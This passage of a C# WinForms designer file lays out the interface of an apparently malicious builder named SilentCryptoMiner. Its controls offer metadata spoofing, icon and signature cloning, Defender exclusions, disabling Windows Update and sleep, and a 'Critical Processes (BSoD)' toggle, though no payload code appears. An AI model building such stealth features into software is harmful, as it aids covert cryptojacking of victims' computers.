            this.btnAssemblyRandom.TabIndex = 5;
            this.btnAssemblyRandom.Text = "Randomize";
            this.btnAssemblyRandom.Click += new System.EventHandler(this.btnAssemblyRandom_Click);
            // 
            // txtAssemblyTitle
            // 
            this.txtAssemblyTitle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyTitle.Enabled = false;
            this.txtAssemblyTitle.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyTitle.Location = new System.Drawing.Point(14, 47);
            this.txtAssemblyTitle.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyTitle.MaxLength = 32767;
            this.txtAssemblyTitle.MultiLine = false;
            this.txtAssemblyTitle.Name = "txtAssemblyTitle";
            this.txtAssemblyTitle.ReadOnly = false;
            this.txtAssemblyTitle.Size = new System.Drawing.Size(176, 24);
            this.txtAssemblyTitle.TabIndex = 0;
            this.txtAssemblyTitle.Text = "Title...";
            this.txtAssemblyTitle.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyTitle.UseSystemPasswordChar = false;
            this.txtAssemblyTitle.WordWrap = false;
            // 
            // btnAssemblyClone
            // 
            this.btnAssemblyClone.BackColor = System.Drawing.Color.Transparent;
            this.btnAssemblyClone.Enabled = false;
            this.btnAssemblyClone.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnAssemblyClone.Location = new System.Drawing.Point(230, 156);
            this.btnAssemblyClone.Margin = new System.Windows.Forms.Padding(2);
            this.btnAssemblyClone.Name = "btnAssemblyClone";
            this.btnAssemblyClone.Size = new System.Drawing.Size(82, 25);
            this.btnAssemblyClone.TabIndex = 6;
            this.btnAssemblyClone.Text = "Clone File";
            this.btnAssemblyClone.Click += new System.EventHandler(this.btnAssemblyClone_Click);
            // 
            // txtAssemblyProduct
            // 
            this.txtAssemblyProduct.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyProduct.Enabled = false;
            this.txtAssemblyProduct.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyProduct.Location = new System.Drawing.Point(230, 47);
            this.txtAssemblyProduct.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyProduct.MaxLength = 32767;
            this.txtAssemblyProduct.MultiLine = false;
            this.txtAssemblyProduct.Name = "txtAssemblyProduct";
            this.txtAssemblyProduct.ReadOnly = false;
            this.txtAssemblyProduct.Size = new System.Drawing.Size(176, 24);
            this.txtAssemblyProduct.TabIndex = 0;
            this.txtAssemblyProduct.Text = "Product...";
            this.txtAssemblyProduct.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyProduct.UseSystemPasswordChar = false;
            this.txtAssemblyProduct.WordWrap = false;
            // 
            // txtAssemblyVersion4
            // 
            this.txtAssemblyVersion4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyVersion4.Enabled = false;
            this.txtAssemblyVersion4.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyVersion4.Location = new System.Drawing.Point(167, 157);
            this.txtAssemblyVersion4.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyVersion4.MaxLength = 32767;
            this.txtAssemblyVersion4.MultiLine = false;
            this.txtAssemblyVersion4.Name = "txtAssemblyVersion4";
            this.txtAssemblyVersion4.ReadOnly = false;
            this.txtAssemblyVersion4.Size = new System.Drawing.Size(23, 24);
            this.txtAssemblyVersion4.TabIndex = 1;
            this.txtAssemblyVersion4.Text = "0";
            this.txtAssemblyVersion4.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyVersion4.UseSystemPasswordChar = false;
            this.txtAssemblyVersion4.WordWrap = false;
            // 
            // txtAssemblyDescription
            // 
            this.txtAssemblyDescription.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyDescription.Enabled = false;
            this.txtAssemblyDescription.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyDescription.Location = new System.Drawing.Point(14, 83);
            this.txtAssemblyDescription.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyDescription.MaxLength = 32767;
            this.txtAssemblyDescription.MultiLine = false;
            this.txtAssemblyDescription.Name = "txtAssemblyDescription";
            this.txtAssemblyDescription.ReadOnly = false;
            this.txtAssemblyDescription.Size = new System.Drawing.Size(176, 24);
            this.txtAssemblyDescription.TabIndex = 0;
            this.txtAssemblyDescription.Text = "Description...";
            this.txtAssemblyDescription.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyDescription.UseSystemPasswordChar = false;
            this.txtAssemblyDescription.WordWrap = false;
            // 
            // txtAssemblyVersion3
            // 
            this.txtAssemblyVersion3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyVersion3.Enabled = false;
            this.txtAssemblyVersion3.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyVersion3.Location = new System.Drawing.Point(140, 157);
            this.txtAssemblyVersion3.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyVersion3.MaxLength = 32767;
            this.txtAssemblyVersion3.MultiLine = false;
            this.txtAssemblyVersion3.Name = "txtAssemblyVersion3";
            this.txtAssemblyVersion3.ReadOnly = false;
            this.txtAssemblyVersion3.Size = new System.Drawing.Size(23, 24);
            this.txtAssemblyVersion3.TabIndex = 2;
            this.txtAssemblyVersion3.Text = "0";
            this.txtAssemblyVersion3.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyVersion3.UseSystemPasswordChar = false;
            this.txtAssemblyVersion3.WordWrap = false;
            // 
            // txtAssemblyCopyright
            // 
            this.txtAssemblyCopyright.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyCopyright.Enabled = false;
            this.txtAssemblyCopyright.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyCopyright.Location = new System.Drawing.Point(230, 83);
            this.txtAssemblyCopyright.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyCopyright.MaxLength = 32767;
            this.txtAssemblyCopyright.MultiLine = false;
            this.txtAssemblyCopyright.Name = "txtAssemblyCopyright";
            this.txtAssemblyCopyright.ReadOnly = false;
            this.txtAssemblyCopyright.Size = new System.Drawing.Size(176, 24);
            this.txtAssemblyCopyright.TabIndex = 0;
            this.txtAssemblyCopyright.Text = "Copyright...";
            this.txtAssemblyCopyright.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyCopyright.UseSystemPasswordChar = false;
            this.txtAssemblyCopyright.WordWrap = false;
            // 
            // txtAssemblyVersion2
            // 
            this.txtAssemblyVersion2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyVersion2.Enabled = false;
            this.txtAssemblyVersion2.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyVersion2.Location = new System.Drawing.Point(113, 157);
            this.txtAssemblyVersion2.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyVersion2.MaxLength = 32767;
            this.txtAssemblyVersion2.MultiLine = false;
            this.txtAssemblyVersion2.Name = "txtAssemblyVersion2";
            this.txtAssemblyVersion2.ReadOnly = false;
            this.txtAssemblyVersion2.Size = new System.Drawing.Size(23, 24);
            this.txtAssemblyVersion2.TabIndex = 3;
            this.txtAssemblyVersion2.Text = "0";
            this.txtAssemblyVersion2.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyVersion2.UseSystemPasswordChar = false;
            this.txtAssemblyVersion2.WordWrap = false;
            // 
            // txtAssemblyCompany
            // 
            this.txtAssemblyCompany.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyCompany.Enabled = false;
            this.txtAssemblyCompany.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyCompany.Location = new System.Drawing.Point(14, 119);
            this.txtAssemblyCompany.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyCompany.MaxLength = 32767;
            this.txtAssemblyCompany.MultiLine = false;
            this.txtAssemblyCompany.Name = "txtAssemblyCompany";
            this.txtAssemblyCompany.ReadOnly = false;
            this.txtAssemblyCompany.Size = new System.Drawing.Size(176, 24);
            this.txtAssemblyCompany.TabIndex = 0;
            this.txtAssemblyCompany.Text = "Company...";
            this.txtAssemblyCompany.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyCompany.UseSystemPasswordChar = false;
            this.txtAssemblyCompany.WordWrap = false;
            // 
            // txtAssemblyVersion1
            // 
            this.txtAssemblyVersion1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyVersion1.Enabled = false;
            this.txtAssemblyVersion1.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyVersion1.Location = new System.Drawing.Point(87, 157);
            this.txtAssemblyVersion1.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyVersion1.MaxLength = 32767;
            this.txtAssemblyVersion1.MultiLine = false;
            this.txtAssemblyVersion1.Name = "txtAssemblyVersion1";
            this.txtAssemblyVersion1.ReadOnly = false;
            this.txtAssemblyVersion1.Size = new System.Drawing.Size(23, 24);
            this.txtAssemblyVersion1.TabIndex = 4;
            this.txtAssemblyVersion1.Text = "0";
            this.txtAssemblyVersion1.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyVersion1.UseSystemPasswordChar = false;
            this.txtAssemblyVersion1.WordWrap = false;
            // 
            // txtAssemblyTrademark
            // 
            this.txtAssemblyTrademark.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyTrademark.Enabled = false;
            this.txtAssemblyTrademark.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyTrademark.Location = new System.Drawing.Point(230, 119);
            this.txtAssemblyTrademark.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyTrademark.MaxLength = 32767;
            this.txtAssemblyTrademark.MultiLine = false;
            this.txtAssemblyTrademark.Name = "txtAssemblyTrademark";
            this.txtAssemblyTrademark.ReadOnly = false;
            this.txtAssemblyTrademark.Size = new System.Drawing.Size(176, 24);
            this.txtAssemblyTrademark.TabIndex = 0;
            this.txtAssemblyTrademark.Text = "Trademark...";
            this.txtAssemblyTrademark.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyTrademark.UseSystemPasswordChar = false;
            this.txtAssemblyTrademark.WordWrap = false;
            // 
            // tabIcon
            // 
            this.tabIcon.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabIcon.Controls.Add(this.chkIcon);
            this.tabIcon.Controls.Add(this.picIcon);
            this.tabIcon.Controls.Add(this.btnIconBrowse);
            this.tabIcon.Controls.Add(this.txtIconPath);
            this.tabIcon.Location = new System.Drawing.Point(89, 4);
            this.tabIcon.Margin = new System.Windows.Forms.Padding(0);
            this.tabIcon.Name = "tabIcon";
            this.tabIcon.Size = new System.Drawing.Size(418, 189);
            this.tabIcon.TabIndex = 3;
            this.tabIcon.Text = "Icon";
            // 
            // chkIcon
            // 
            this.chkIcon.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkIcon.BackColor = System.Drawing.Color.Transparent;
            this.chkIcon.Checked = false;
            this.chkIcon.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkIcon.ForeColor = System.Drawing.Color.Black;
            this.chkIcon.Location = new System.Drawing.Point(14, 12);
            this.chkIcon.Margin = new System.Windows.Forms.Padding(2);
            this.chkIcon.Name = "chkIcon";
            this.chkIcon.Size = new System.Drawing.Size(111, 24);
            this.chkIcon.TabIndex = 21;
            this.chkIcon.Text = "Disabled";
            this.chkIcon.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkIcon_CheckedChanged);
            // 
            // picIcon
            // 
            this.picIcon.ErrorImage = null;
            this.picIcon.Image = global::SilentCryptoMiner.Properties.Resources.icon1;
            this.picIcon.InitialImage = null;
            this.picIcon.Location = new System.Drawing.Point(160, 81);
            this.picIcon.Margin = new System.Windows.Forms.Padding(2);
            this.picIcon.Name = "picIcon";
            this.picIcon.Size = new System.Drawing.Size(96, 96);
            this.picIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.picIcon.TabIndex = 11;
            this.picIcon.TabStop = false;
            // 
            // btnIconBrowse
            // 
            this.btnIconBrowse.BackColor = System.Drawing.Color.Transparent;
            this.btnIconBrowse.Enabled = false;
            this.btnIconBrowse.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnIconBrowse.Location = new System.Drawing.Point(14, 48);
            this.btnIconBrowse.Margin = new System.Windows.Forms.Padding(2);
            this.btnIconBrowse.Name = "btnIconBrowse";
            this.btnIconBrowse.Size = new System.Drawing.Size(69, 25);
            this.btnIconBrowse.TabIndex = 9;
            this.btnIconBrowse.Text = "Browse";
            this.btnIconBrowse.Click += new System.EventHandler(this.btnIconBrowse_Click);
            // 
            // txtIconPath
            // 
            this.txtIconPath.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtIconPath.ForeColor = System.Drawing.Color.Silver;
            this.txtIconPath.Location = new System.Drawing.Point(87, 49);
            this.txtIconPath.Margin = new System.Windows.Forms.Padding(2);
            this.txtIconPath.MaxLength = 32767;
            this.txtIconPath.MultiLine = false;
            this.txtIconPath.Name = "txtIconPath";
            this.txtIconPath.ReadOnly = false;
            this.txtIconPath.Size = new System.Drawing.Size(302, 24);
            this.txtIconPath.TabIndex = 10;
            this.txtIconPath.Text = "Path to icon...";
            this.txtIconPath.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtIconPath.UseSystemPasswordChar = false;
            this.txtIconPath.WordWrap = false;
            // 
            // tabSignature
            // 
            this.tabSignature.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabSignature.Controls.Add(this.labelSignatureData);
            this.tabSignature.Controls.Add(this.txtSignatureData);
            this.tabSignature.Controls.Add(this.btnSignatureClone);
            this.tabSignature.Controls.Add(this.btnSignatureBrowse);
            this.tabSignature.Controls.Add(this.txtSignaturePath);
            this.tabSignature.Controls.Add(this.chkSignature);
            this.tabSignature.Location = new System.Drawing.Point(89, 4);
            this.tabSignature.Margin = new System.Windows.Forms.Padding(0);
            this.tabSignature.Name = "tabSignature";
            this.tabSignature.Size = new System.Drawing.Size(418, 189);
            this.tabSignature.TabIndex = 6;
            this.tabSignature.Text = "Signature";
            // 
            // labelSignatureData
            // 
            this.labelSignatureData.AutoEllipsis = true;
            this.labelSignatureData.BackColor = System.Drawing.Color.Transparent;
            this.labelSignatureData.Location = new System.Drawing.Point(11, 83);
            this.labelSignatureData.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelSignatureData.Name = "labelSignatureData";
            this.labelSignatureData.Size = new System.Drawing.Size(391, 17);
            this.labelSignatureData.TabIndex = 27;
            this.labelSignatureData.Text = "Signature Data (Base64):";
            // 
            // txtSignatureData
            // 
            this.txtSignatureData.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtSignatureData.Font = new System.Drawing.Font("Segoe UI", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txtSignatureData.ForeColor = System.Drawing.Color.Silver;
            this.txtSignatureData.Location = new System.Drawing.Point(14, 103);
            this.txtSignatureData.Margin = new System.Windows.Forms.Padding(2);
            this.txtSignatureData.MaxLength = 32767;
            this.txtSignatureData.MultiLine = true;
            this.txtSignatureData.Name = "txtSignatureData";
            this.txtSignatureData.ReadOnly = true;
            this.txtSignatureData.Size = new System.Drawing.Size(388, 74);
            this.txtSignatureData.TabIndex = 26;
            this.txtSignatureData.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtSignatureData.UseSystemPasswordChar = false;
            this.txtSignatureData.WordWrap = false;
            // 
            // btnSignatureClone
            // 
            this.btnSignatureClone.BackColor = System.Drawing.Color.Transparent;
            this.btnSignatureClone.Enabled = false;
            this.btnSignatureClone.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnSignatureClone.Location = new System.Drawing.Point(333, 48);
            this.btnSignatureClone.Margin = new System.Windows.Forms.Padding(2);
            this.btnSignatureClone.Name = "btnSignatureClone";
            this.btnSignatureClone.Size = new System.Drawing.Size(69, 25);
            this.btnSignatureClone.TabIndex = 25;
            this.btnSignatureClone.Text = "Clone";
            this.btnSignatureClone.Click += new System.EventHandler(this.btnSignatureClone_Click);
            // 
            // btnSignatureBrowse
            // 
            this.btnSignatureBrowse.BackColor = System.Drawing.Color.Transparent;
            this.btnSignatureBrowse.Enabled = false;
            this.btnSignatureBrowse.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnSignatureBrowse.Location = new System.Drawing.Point(14, 48);
            this.btnSignatureBrowse.Margin = new System.Windows.Forms.Padding(2);
            this.btnSignatureBrowse.Name = "btnSignatureBrowse";
            this.btnSignatureBrowse.Size = new System.Drawing.Size(69, 25);
            this.btnSignatureBrowse.TabIndex = 23;
            this.btnSignatureBrowse.Text = "Browse";
            this.btnSignatureBrowse.Click += new System.EventHandler(this.btnSignatureBrowse_Click);
            // 
            // txtSignaturePath
            // 
            this.txtSignaturePath.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtSignaturePath.ForeColor = System.Drawing.Color.Silver;
            this.txtSignaturePath.Location = new System.Drawing.Point(87, 49);
            this.txtSignaturePath.Margin = new System.Windows.Forms.Padding(2);
            this.txtSignaturePath.MaxLength = 32767;
            this.txtSignaturePath.MultiLine = false;
            this.txtSignaturePath.Name = "txtSignaturePath";
            this.txtSignaturePath.ReadOnly = false;
            this.txtSignaturePath.Size = new System.Drawing.Size(243, 24);
            this.txtSignaturePath.TabIndex = 24;
            this.txtSignaturePath.Text = "Path to executable to clone...";
            this.txtSignaturePath.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtSignaturePath.UseSystemPasswordChar = false;
            this.txtSignaturePath.WordWrap = false;
            // 
            // chkSignature
            // 
            this.chkSignature.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkSignature.BackColor = System.Drawing.Color.Transparent;
            this.chkSignature.Checked = false;
            this.chkSignature.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkSignature.ForeColor = System.Drawing.Color.Black;
            this.chkSignature.Location = new System.Drawing.Point(14, 12);
            this.chkSignature.Margin = new System.Windows.Forms.Padding(2);
            this.chkSignature.Name = "chkSignature";
            this.chkSignature.Size = new System.Drawing.Size(111, 24);
            this.chkSignature.TabIndex = 22;
            this.chkSignature.Text = "Disabled";
            this.chkSignature.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkSignature_CheckedChanged);
            // 
            // tabOptions
            // 
            this.tabOptions.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabOptions.Controls.Add(this.picAdmin5);
            this.tabOptions.Controls.Add(this.labelOptionProcessProtect);
            this.tabOptions.Controls.Add(this.toggleProcessProtect);
            this.tabOptions.Controls.Add(this.btnAdvancedOptions);
            this.tabOptions.Controls.Add(this.picAdmin2);
            this.tabOptions.Controls.Add(this.labelOptionWindowsUpdate);
            this.tabOptions.Controls.Add(this.toggleWindowsUpdate);
            this.tabOptions.Controls.Add(this.picAdmin3);
            this.tabOptions.Controls.Add(this.chkBlockWebsites);
            this.tabOptions.Controls.Add(this.txtBlockWebsites);
            this.tabOptions.Controls.Add(this.labelDisableSleep);
            this.tabOptions.Controls.Add(this.toggleDisableSleep);
            this.tabOptions.Controls.Add(this.labelOptionAdministrator);
            this.tabOptions.Controls.Add(this.toggleAdministrator);
            this.tabOptions.Controls.Add(this.picAdmin1);
            this.tabOptions.Controls.Add(this.labelOptionWD);
            this.tabOptions.Controls.Add(this.toggleWDExclusions);
            this.tabOptions.Location = new System.Drawing.Point(89, 4);
            this.tabOptions.Name = "tabOptions";
            this.tabOptions.Size = new System.Drawing.Size(418, 189);
            this.tabOptions.TabIndex = 5;
            this.tabOptions.Text = "Options";
            // 
            // picAdmin5
            // 
            this.picAdmin5.BackColor = System.Drawing.Color.Transparent;
            this.picAdmin5.Image = global::SilentCryptoMiner.Properties.Resources.microsoft_admin;
            this.picAdmin5.Location = new System.Drawing.Point(224, 90);
            this.picAdmin5.Name = "picAdmin5";
            this.picAdmin5.Size = new System.Drawing.Size(20, 20);
            this.picAdmin5.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.picAdmin5.TabIndex = 143;
            this.picAdmin5.TabStop = false;
            // 
            // labelOptionProcessProtect
            // 
            this.labelOptionProcessProtect.AutoEllipsis = true;
            this.labelOptionProcessProtect.BackColor = System.Drawing.Color.Transparent;
            this.labelOptionProcessProtect.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelOptionProcessProtect.ForeColor = System.Drawing.Color.Gray;
            this.labelOptionProcessProtect.Location = new System.Drawing.Point(10, 91);
            this.labelOptionProcessProtect.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelOptionProcessProtect.Name = "labelOptionProcessProtect";
            this.labelOptionProcessProtect.Size = new System.Drawing.Size(157, 17);
            this.labelOptionProcessProtect.TabIndex = 142;
            this.labelOptionProcessProtect.Text = "Critical Processes (BSoD):";
            // 
            // toggleProcessProtect
            // 
            this.toggleProcessProtect.BackColor = System.Drawing.Color.Transparent;
            this.toggleProcessProtect.Checked = false;
            this.toggleProcessProtect.ForeColor = System.Drawing.Color.Black;
            this.toggleProcessProtect.Location = new System.Drawing.Point(169, 88);
            this.toggleProcessProtect.Margin = new System.Windows.Forms.Padding(2);
            this.toggleProcessProtect.Name = "toggleProcessProtect";
            this.toggleProcessProtect.Size = new System.Drawing.Size(50, 24);
            this.toggleProcessProtect.TabIndex = 141;
            // 
            // btnAdvancedOptions
            // 
            this.btnAdvancedOptions.BackColor = System.Drawing.Color.Transparent;
            this.btnAdvancedOptions.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnAdvancedOptions.Location = new System.Drawing.Point(12, 157);
            this.btnAdvancedOptions.Margin = new System.Windows.Forms.Padding(2);
            this.btnAdvancedOptions.Name = "btnAdvancedOptions";
            this.btnAdvancedOptions.Size = new System.Drawing.Size(155, 24);
            this.btnAdvancedOptions.TabIndex = 140;
            this.btnAdvancedOptions.Text = "Advanced Options";
            this.btnAdvancedOptions.Click += new System.EventHandler(this.btnAdvancedOptions_Click);
            // 
            // picAdmin2
            // 
            this.picAdmin2.BackColor = System.Drawing.Color.Transparent;
            this.picAdmin2.Image = global::SilentCryptoMiner.Properties.Resources.microsoft_admin;
            this.picAdmin2.Location = new System.Drawing.Point(224, 64);
            this.picAdmin2.Name = "picAdmin2";
            this.picAdmin2.Size = new System.Drawing.Size(20, 20);
            this.picAdmin2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.picAdmin2.TabIndex = 139;
            this.picAdmin2.TabStop = false;
            // 
            // labelOptionWindowsUpdate
            // 
            this.labelOptionWindowsUpdate.AutoEllipsis = true;
            this.labelOptionWindowsUpdate.BackColor = System.Drawing.Color.Transparent;
            this.labelOptionWindowsUpdate.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelOptionWindowsUpdate.ForeColor = System.Drawing.Color.Gray;
            this.labelOptionWindowsUpdate.Location = new System.Drawing.Point(9, 64);
            this.labelOptionWindowsUpdate.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelOptionWindowsUpdate.Name = "labelOptionWindowsUpdate";
            this.labelOptionWindowsUpdate.Size = new System.Drawing.Size(158, 17);
            this.labelOptionWindowsUpdate.TabIndex = 138;
            this.labelOptionWindowsUpdate.Text = "Disable Windows Update:";
            // 
            // toggleWindowsUpdate
            // 
            this.toggleWindowsUpdate.BackColor = System.Drawing.Color.Transparent;
            this.toggleWindowsUpdate.Checked = false;
            this.toggleWindowsUpdate.ForeColor = System.Drawing.Color.Black;
            this.toggleWindowsUpdate.Location = new System.Drawing.Point(169, 61);
            this.toggleWindowsUpdate.Margin = new System.Windows.Forms.Padding(2);
            this.toggleWindowsUpdate.Name = "toggleWindowsUpdate";
            this.toggleWindowsUpdate.Size = new System.Drawing.Size(50, 24);
            this.toggleWindowsUpdate.TabIndex = 137;
            // 
            // picAdmin3
            // 
            this.picAdmin3.BackColor = System.Drawing.Color.Transparent;
            this.picAdmin3.Image = global::SilentCryptoMiner.Properties.Resources.microsoft_admin;
            this.picAdmin3.Location = new System.Drawing.Point(392, 131);
            this.picAdmin3.Name = "picAdmin3";
            this.picAdmin3.Size = new System.Drawing.Size(20, 20);
            this.picAdmin3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.picAdmin3.TabIndex = 136;
            this.picAdmin3.TabStop = false;
            // 
            // chkBlockWebsites
            // 
            this.chkBlockWebsites.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkBlockWebsites.BackColor = System.Drawing.Color.Transparent;
            this.chkBlockWebsites.Checked = false;
            this.chkBlockWebsites.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkBlockWebsites.ForeColor = System.Drawing.Color.Black;
            this.chkBlockWebsites.Location = new System.Drawing.Point(263, 129);
            this.chkBlockWebsites.Margin = new System.Windows.Forms.Padding(2);
            this.chkBlockWebsites.Name = "chkBlockWebsites";
            this.chkBlockWebsites.Size = new System.Drawing.Size(146, 24);
            this.chkBlockWebsites.TabIndex = 135;
            this.chkBlockWebsites.Text = "Block Websites";
            this.chkBlockWebsites.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkBlockWebsites_CheckedChanged);
            // 
            // txtBlockWebsites
            // 
            this.txtBlockWebsites.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtBlockWebsites.Enabled = false;
            this.txtBlockWebsites.ForeColor = System.Drawing.Color.Silver;
            this.txtBlockWebsites.Location = new System.Drawing.Point(263, 157);
            this.txtBlockWebsites.Margin = new System.Windows.Forms.Padding(2);
            this.txtBlockWebsites.MaxLength = 32767;
            this.txtBlockWebsites.MultiLine = false;
            this.txtBlockWebsites.Name = "txtBlockWebsites";
            this.txtBlockWebsites.ReadOnly = false;
            this.txtBlockWebsites.Size = new System.Drawing.Size(149, 24);
            this.txtBlockWebsites.TabIndex = 134;
            this.txtBlockWebsites.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtBlockWebsites.UseSystemPasswordChar = false;
            this.txtBlockWebsites.WordWrap = false;
            // 
            // labelDisableSleep
            // 
            this.labelDisableSleep.AutoEllipsis = true;
            this.labelDisableSleep.BackColor = System.Drawing.Color.Transparent;
            this.labelDisableSleep.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelDisableSleep.ForeColor = System.Drawing.Color.Gray;
            this.labelDisableSleep.Location = new System.Drawing.Point(245, 10);
            this.labelDisableSleep.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelDisableSleep.Name = "labelDisableSleep";
            this.labelDisableSleep.Size = new System.Drawing.Size(112, 17);
            this.labelDisableSleep.TabIndex = 109;
            this.labelDisableSleep.Text = "Disable Sleep:";
            // 
            // toggleDisableSleep
            // 
            this.toggleDisableSleep.BackColor = System.Drawing.Color.Transparent;
            this.toggleDisableSleep.Checked = false;
            this.toggleDisableSleep.ForeColor = System.Drawing.Color.Black;
            this.toggleDisableSleep.Location = new System.Drawing.Point(362, 7);
            this.toggleDisableSleep.Margin = new System.Windows.Forms.Padding(2);
            this.toggleDisableSleep.Name = "toggleDisableSleep";
            this.toggleDisableSleep.Size = new System.Drawing.Size(50, 24);
            this.toggleDisableSleep.TabIndex = 108;
            // 
            // labelOptionAdministrator
            // 
            this.labelOptionAdministrator.AutoEllipsis = true;
            this.labelOptionAdministrator.BackColor = System.Drawing.Color.Transparent;
            this.labelOptionAdministrator.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelOptionAdministrator.ForeColor = System.Drawing.Color.Gray;
            this.labelOptionAdministrator.Location = new System.Drawing.Point(9, 11);
            this.labelOptionAdministrator.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelOptionAdministrator.Name = "labelOptionAdministrator";
            this.labelOptionAdministrator.Size = new System.Drawing.Size(158, 17);
            this.labelOptionAdministrator.TabIndex = 99;
            this.labelOptionAdministrator.Text = "Run as Administrator:";
            // 
